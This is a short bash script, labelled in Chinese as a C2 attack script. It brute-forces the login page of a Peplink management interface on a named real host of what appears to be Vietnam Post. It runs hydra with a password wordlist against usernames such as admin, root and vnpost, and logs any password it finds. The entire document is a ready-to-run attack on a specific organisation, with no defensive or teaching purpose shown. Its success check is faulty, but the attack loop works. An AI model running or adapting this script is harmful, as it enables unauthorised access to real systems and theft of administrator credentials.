#!/bin/bash
# C2服务器持续攻击脚本

TARGET="vps.vnpost.vn"
WORDLIST="/root/vnpost_attack/vnpost_mega_wordlist.txt"
LOG="/root/vnpost_attack/attack.log"

echo "[$(date)] 开始攻击MANGA系统..." | tee -a $LOG

# 检查hydra
if ! command -v hydra &> /dev/null; then
    echo "[!] 安装hydra..."
    apt update && apt install -y hydra
fi

# 多用户名攻击
USERS=("admin" "root" "peplink" "administrator" "manager" "vnpost")

for user in "${USERS[@]}"; do
    echo "[*] 测试用户: $user" | tee -a $LOG
    
    # hydra攻击
    hydra -l $user -P $WORDLIST \
        -s 443 \
        -t 10 \
        -w 5 \
        -f \
        $TARGET \
        https-post-form "/cgi-bin/MANGA/index.cgi:func=login&username=^USER^&password=^PASS^:errorMessage" \
        2>&1 | tee -a $LOG
    
    # 检查是否成功
    if grep -q "login:" $LOG | tail -1; then
        echo "[✅] 找到密码！用户: $user" | tee -a $LOG
        tail -5 $LOG
        exit 0
    fi
    
    sleep 2
done

echo "[$(date)] 本轮攻击完成" | tee -a $LOG
